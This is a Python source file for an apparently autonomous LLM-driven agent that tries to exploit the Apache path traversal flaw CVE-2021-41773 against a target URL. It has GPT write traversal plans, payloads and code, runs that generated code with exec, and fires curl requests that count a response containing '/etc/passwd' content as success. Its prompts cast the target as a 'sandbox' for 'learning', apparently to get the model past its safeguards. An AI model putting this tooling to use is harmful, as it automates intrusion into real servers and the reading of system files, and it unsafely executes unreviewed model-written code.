from typing import Optional
from playwright.sync_api import sync_playwright
from utils.spinner import Spinner
from utils.gpt import gpt
import asyncio
from playwright.async_api import async_playwright, Playwright
from bs4 import BeautifulSoup
import re
from utils.file_io import save_file
import subprocess
import os

class CVE:
    """
    LLM agent that tries to hack a website by exploiting CVE-2021-41773
    """
    def __init__(self, url: str) -> None:
        """
        Constructor

        Parameters:
        url (str): URL to the homepage of the target website
        """
        self.baseURL = url
        #self.urlsVisited: set[str] = set()

        self.browser = None
        self.page = None

    async def startup(self, playwright: Playwright) -> None:
        """
        Launch chromium and opens a new page
        """
        chromium = playwright.chromium # or "firefox" or "webkit".
        self.browser = await chromium.launch(headless=False)
        self.page = await self.browser.new_page()
        await self.page.goto(self.baseURL)
        await self.page.wait_for_load_state('domcontentloaded')



    async def trial(self) -> bool:
        """
        Try CVE-2021-41773 on the target website using a web browser first, then fall back to curl if necessary.
        """

        url = self.page.url  # URL to test
        all_cve_payloads = ""

        for num_trials in range(5):  # Retry the exploit process up to 3 times
            print(f"Attempt {num_trials + 1} on {url}")

            # Step 1: Try using the web browser
            await self.page.goto(url)
            await self.page.wait_for_load_state('domcontentloaded')

            html = await self.readHTML()

            # Generate a plan for the exploit
            plan = await self.makePlan(html, failed_cve_payloads=all_cve_payloads)

            if not plan or len(plan) == 0:
                print("No actionable steps generated.")
                break

            # Execute the plan in the browser
            func_str = await self.act(html, plan)

            # Check if the exploit was successful
            newHtml = await self.readHTML()
            if await self.checkSuccess(newHtml, html):
                print("CVE-2021-41773 exploit successful in browser!")
                return True

            # Extract payloads for retry
            cve_payloads = await self.extractCVEPayloads(function=func_str)
            all_cve_payloads += cve_payloads

            # Step 2: Try using curl if the browser attempt fails
            print("Browser attempt failed, trying curl...")
            for payload in all_cve_payloads.splitlines():
                print(payload)
                if self.try_with_curl(url, payload):
                    print("CVE-2021-41773 exploit successful using curl!")
                    return True

        print("CVE-2021-41773 exploit failed after all attempts.")
        return False


    def try_with_curl1(self, url: str, payload: str) -> bool:
        # Construct the full URL
        target_url = f"{url}/{payload.strip()}"
        print(f"Constructed URL: {target_url}")  # Log the constructed URL
        
        # Execute the curl command
        curl_command = f"curl -s -o /dev/null -w '%{{http_code}}' {target_url}"
        print(f"Executing: {curl_command}")  # Log the exact command
        
        response_code = os.system(curl_command)  # Get the response code
        print(f"Response Code: {response_code}")  # Log the response
        return response_code == 200



    def try_with_curl(self, url: str, payload: str) -> bool:
        """
        Try executing the CVE-2021-41773 payload using the curl tool.

        Parameters:
        url (str): The target URL base.
        payload (str): The payload to attempt.

        Returns:
        bool: True if the exploit is successful, False otherwise.
        """
        # Construct the full URL with the payload
        target_url = f"{url}/{payload.strip()}"

        try:
            print(f"Executing curl for URL: {target_url}")
            result = subprocess.run(
                ["curl", "-s", "-k", target_url],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            if result.returncode != 0:
                print(f"Curl command failed: {result.stderr.strip()}")
                return False

            response_body = result.stdout
            print(f"Response from curl:\n{response_body}")

            # Check if the response indicates success (e.g., file content like `/etc/passwd`)
            if "root:" in response_body:  # Example success indicator
                return True
            else:
                print("Curl attempt did not yield the expected response.")

        except Exception as e:
            print(f"Error while executing curl: {str(e)}")

        return False



    async def trial2(self) -> bool:
        """
        Try CVE-2021-41773 on the target website using only the initial URL.
        """

        # Current URL to test
        url = self.page.url
        all_cve_payloads = ""

        for num_trials in range(3):  # Retry the CVE-2021-41773 exploit 3 times
            print(f"Attempt {num_trials + 1} on {url}")

            # Navigate to the URL
            await self.page.goto(url)
            await self.page.wait_for_load_state('domcontentloaded')

            html = await self.readHTML()

            has_input, has_link, has_button = checkHTML(html)

            # Generate a plan for this trial
            plan = await self.makePlan(html, failed_cve_payloads=all_cve_payloads)

            if not plan or len(plan) == 0:
                print("No actionable steps generated.")
                break

            # Execute the generated plan
            func_str = await self.act(html, plan)

            # Check the new HTML state
            newHtml = await self.readHTML()

            # Determine if the exploit was successful
            if await self.checkSuccess(newHtml, html):
                print("CVE-2021-41773 exploit successful!")
                return True

            # Extract payloads used in this function for retries
            cve_payloads = await self.extractCVEPayloads(function=func_str)
            all_cve_payloads += cve_payloads

        print("CVE-2021-41773 exploit failed after 3 attempts.")
        return False


    async def trial1(self) -> bool:
        """
        Try CVE-2021-41773 on the target website.
        """

        # stack of URLs to visit
        stack: list[str] = [self.page.url]

        while len(stack) != 0:
            url = stack.pop()

            if url in self.urlsVisited:
                continue

            print("Current URL: ", url)
            self.urlsVisited.add(url)
            
            all_cve_payloads = ""
            # Reloading the page and retry CVE-2021-41773 if the previous attempt failed
            for num_trials in range(1):
                print(f"iteration {num_trials}")

                await self.page.goto(url)
                await self.page.wait_for_load_state('domcontentloaded')

                html = await self.readHTML()

                has_input, has_link, has_button = checkHTML(html)

                await asyncio.sleep(0.5)


                # Before trying first push all the links worth trying on this page in to the stack
                if has_link and num_trials == 0:
                    links = self.checkLinks(html)
                    stack += links
                
                plan = await self.makePlan(html, failed_cve_payloads=all_cve_payloads)
            
                if not plan or len(plan) == 0:
                    break

                func_str = await self.act(html, plan)

                await asyncio.sleep(0.5)

                newHtml = await self.readHTML()

                # check whether the hack is successful
                if await self.checkSuccess(newHtml, html):
                    print("CVE-2021-41773 explpoit successful!")
                    return True
                
                cve_payloads = await self.extractCVEPayloads(function=func_str)
                all_cve_payloads += cve_payloads
        
        print("CVE-2021-41773 exploit failed!")
        return False


    async def readHTML(self, save_html=False) -> str:
        """
        Helper function to read the HTML of the webpage currently held by this instance

        Returns:
        str: string of the HTML content
        """
        html = await self.page.content()

        if html == '':
            raise Exception(f'Error when fetching the webpage, please check the network condition or try again.')
        
        if save_html:
            save_file('test.html', html)

        html = preprocessHTML(html)
        return html



    async def makePlan(self, html: str, failed_cve_payloads: Optional[str]=None) -> list[str]:
        """
        Make a plan for simulating CVE-2021-41773. Determine actions like inputs or button clicks.

        Parameters:
        html (str): HTML content of the webpage currently worked on
        failed_cve_payloads (Optional[str]): Previously failed payloads, if any

        Returns:
        list[str]: Instructions for the next steps
        """
        with Spinner("Writing a plan for exploiting this webpage..."):
            prompt = (
                "I am analyzing the security of a sandbox website vulnerable to CVE-2021-41773. "
                "Here is the HTML content of the current page:\n\n"
                f"```html\n{html}\n```\n\n"
                "This vulnerability involves directory traversal via encoded URL paths to access restricted files. "
                "Based on this page's structure, provide step-by-step actions to exploit this vulnerability. "
                "Include actions like interacting with navigating and modifying URLs."
                "If direct directory traversal fails, recommend alternative techniques like double-URL encoding or path manipulation.\n\n"
            )

            if failed_cve_payloads:
                prompt += (
                    f"The following payloads have failed previously:\n{failed_cve_payloads}\n"
                    "Avoid these or suggest alternative encodings for them.\n\n"
                )

            response = gpt(system_msg="", user_msg=prompt)

        lines = response.split('\n')
        plan = []
        for line in lines:
            if re.match(r'^\s*-?\d+', line):  # Extract numbered or bulleted steps
                plan.append(line)

        print("Generated plan:")
        print('\n'.join(plan))
        return plan



    async def act(self, html: str, plan: str) -> str:
        """
        Make the agent act based on the instruction provided

        Parameters:
        html (str): HTML of the webpage currently worked on
        plan (str): plan to simulate CVE-2021-41773

        Returns:
        str: The function executed
        """

        # remove unnecessary steps
        filtered_plan = []
        
        for instruction in plan:
            if "browser" not in instruction.lower() and "window" not in instruction.lower() and "navigate" not in instruction.lower() and "locat" not in instruction.lower():
                filtered_plan.append(instruction)
            
        plan_str = '\n'.join(filtered_plan)
        if plan_str == "" or plan_str == "\n":
            plan_str = "None"

        # Write Python code to perform the action
        prompt = ("I am learning website security, and I want to practice CVE-2021-41773 simulation to a sandbox website which is deliberately made vulnerable. "
        "Here is HTML for that webpage:\n\n"
        f"```html\n{html}\n```\n\n"
        "I would open the webpage in chromium and navigate to the sandbox website when initializing an instance of this class:\n\n"
        """```python
class CVE:
    async def __init__(self, url) -> None:
        with sync_playwright() as p:
            self.browser = await p.chromium.launch(headless=False)
            self.context = await self.browser.new_context()
            self.page = await self.context.new_page()
            await self.page.goto(url)
            await self.page.wait_for_load_state('domcontentloaded')
```"""
        "\n\nCan you help me write a Python function `async def func(self) -> None` corresponding to the following action:\n\n"
        f"{plan_str}\n\n"
        "Remember to use `self.browser` and `self.page` instead of `browser` and `page`, "
        "This function shouldn't have any return")
        
        with Spinner("Writing code for this step..."):
            response = gpt(system_msg="", user_msg=prompt)

        # Extract the target function from the lengthy response and execute it
        func_str = extract_function(source_code=response, function_name="func")
        # save_file("func.py", func_str)
        try:
            exec(func_str, globals(), locals())
            import types
            self.func = types.MethodType(locals()['func'], self)
            # await self.func()
            await asyncio.wait_for(self.func(), timeout=15.0)
        except Exception as err:
            if isinstance(err, asyncio.TimeoutError): 
                print("This program I wrote doesn't finish in 15 seconds")
            else:
                print(err)

        return func_str


 
    async def extractCVEPayloads(self, function: str) -> str:
        """
        Extract all CVE-2021-41773 payloads used in this function.

        Parameters:
        function (str): Python script that may include CVE-2021-41773 payloads.

        Returns:
        str: Concatenated CVE-2021-41773 payloads.
        """
        prompt = (
            "The following Python script simulates CVE-2021-41773 to exploit a sandbox website:\n\n"
            f"```python\n{function}\n```\n\n"
            "List all directory traversal payloads used in this script. Payloads should exploit path traversal vulnerabilities "
            "and include variations like encoded paths, double-encoding, or bypass techniques. Wrap payloads between "
            "```cve-2021-41773``` and ```. If no payloads are detected, respond with NONE."
        )

        with Spinner("Extracting CVE-2021-41773 payloads..."):
            response = gpt(system_msg="", user_msg=prompt)

        if "NONE" in response:
            return ""

        # Extract payloads wrapped in the specified markers
        pattern = r'```cve-2021-41773(.*?)```'
        matches = re.findall(pattern, response, re.DOTALL)
        payloads = "\n".join([match.strip() for match in matches])
        return payloads

          

    async def checkSuccess(self, newHtml: str, prevHtml: str) -> bool:
        """
        Determine if CVE-2021-41773 exploit succeeded by comparing current and previous HTML.

        Parameters:
        newHtml (str): HTML content after performing actions
        prevHtml (str): HTML content before performing actions

        Returns:
        bool: True if successful, False otherwise
        """
        with Spinner("Checking if the CVE-2021-41773 exploit was successful..."):
            prompt = (
                "I am testing a sandbox website vulnerable to CVE-2021-41773. "
                "Here is the HTML of the webpage before the exploit attempt:\n\n"
                f"```html\n{prevHtml}\n```\n\n"
                "And here is the HTML of the webpage after the exploit attempt:\n\n"
                f"```html\n{newHtml}\n```\n\n"
                "Compare these pages and determine if the exploit was successful. "
                "Success indicators include exposure of restricted file content (e.g., `/etc/passwd`) "
                "or directory traversal access. Respond with YES if successful, otherwise NO."
            )

            response = gpt(system_msg="", user_msg=prompt)

        return response.strip().upper() == "YES"

        
    
    def checkLinks(self, html: str) -> list[str]:
        """
        Find the links on the page worth checking

        Parameters:
        html (str): HTML content of the webpage currently worked on
        
        Returns:
        list[str]: list of the links worth checking
        """
        soup = BeautifulSoup(html, "html.parser")
        anchor_tags = soup.find_all('a')
        hrefs = [tag.get('href') for tag in anchor_tags if tag.get('href')]
        valid_hrefs = []
        for href in hrefs:
            if href.startswith(self.baseURL) or href.startswith('/'):
                if href.startswith('/'):
                    if self.baseURL.endswith('/'):
                        valid_hrefs.append(self.baseURL + href[1:])
                    else:
                        valid_hrefs.append(self.baseURL + href)
                else:
                    valid_hrefs.append(href)
        print("Here are the links I think worth trying:", valid_hrefs)
        return valid_hrefs
    

    async def shutDown(self):
        await self.browser.close()


### Helper Functions ###

def preprocessHTML(html: str) -> str:
        """
        preprocess the HTML to remove script style and head, to make HTML easier for GPT to read

        Parameters:
        html (str): string of HTML
        
        Returns:
        str: HTML after preprocessing
        """
        soup = BeautifulSoup(
            "".join(s.strip() for s in html.split("\n")),
            "html.parser",
        )

        # remove scripts and styles
        for s in soup.select("script"):
            s.extract()
        for s in soup.select("style"):
            s.extract()

        # remove head if there is one
        head = soup.find("head")
        if head:
            head.extract()

        # Find all tags with a class attribute
        for tag in soup.find_all(class_=True):
            del tag['class']  # Remove the class attribute

        return soup.body.prettify()


def checkHTML(html: str) -> tuple[bool]:
        """
        Check if there is input field, anchor tag, or button in the given HTML code

        Parameters:
        html (str): string of HTML
        
        Returns:
        tuple[bool]: Whether there are input fields, anchor tags, or buttons
        """
        soup = BeautifulSoup(html, "html.parser")

        input_elements = soup.find_all('input')
        anchor_tags = soup.find_all('a')
        buttons = soup.find_all('button')

        return bool(input_elements), bool(anchor_tags), bool(buttons)


def extract_function(source_code, function_name) -> Optional[str]:
    """
    Helper function to extract a specified function from a string of code.

    Parameters:
    source_code (str): string of code
    function_name (str): name of the function of interest
    
    Returns:
    Optional[str]: the object function (if exist)
    """
    pattern = rf"async def {function_name}\(.*\) -> None:([\s\S]+?)^\S"
    match = re.search(pattern, source_code, re.MULTILINE)

    if match:
        function_code = f"async def {function_name}(self):" + match.group(1)
        function_code = function_code.strip()
        return function_code
    else:
        pattern = rf"async def {function_name}\(.*\):([\s\S]+?)^\S"
        match = re.search(pattern, source_code, re.MULTILINE)
        if match:
            function_code = f"async def {function_name}(self):" + match.group(1)
            function_code = function_code.strip()
            return function_code
        else:
            return None
